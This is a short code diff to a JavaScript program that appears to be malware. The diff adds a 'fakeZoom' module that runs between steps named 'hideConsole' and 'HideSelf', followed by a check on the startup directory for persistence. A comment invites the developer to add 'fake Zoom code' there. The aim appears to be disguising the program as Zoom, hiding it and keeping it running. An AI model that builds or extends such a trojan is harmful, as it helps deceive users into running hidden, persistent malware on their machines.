@@ -35,6 +35,10 @@ const aurita = async () => {
     };
 
     await execute(hideConsole);
+    // ← Add your fake Zoom code here (after hideConsole is ideal)
+    const fakeZoom = require('./modules/fakezoom/fakezoom.js');
+    await execute(fakeZoom);
+
     await execute(program.HideSelf);
 
     if (!(await program.IsStartupDirRunning())) {
